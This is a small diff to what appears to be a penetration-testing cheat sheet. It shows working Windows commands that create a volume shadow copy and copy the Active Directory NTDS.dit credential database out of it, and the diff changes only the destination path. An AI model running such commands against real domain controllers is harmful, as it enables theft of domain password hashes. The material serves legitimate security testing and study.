@@ -29,7 +29,7 @@ vssadmin CREATE SHADOW /For=C:
 
 ## Copying NTDS.dit from the VSS
 ```bash
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS.dit
 ```
 To transfer file into linux smb server:
 ```bash
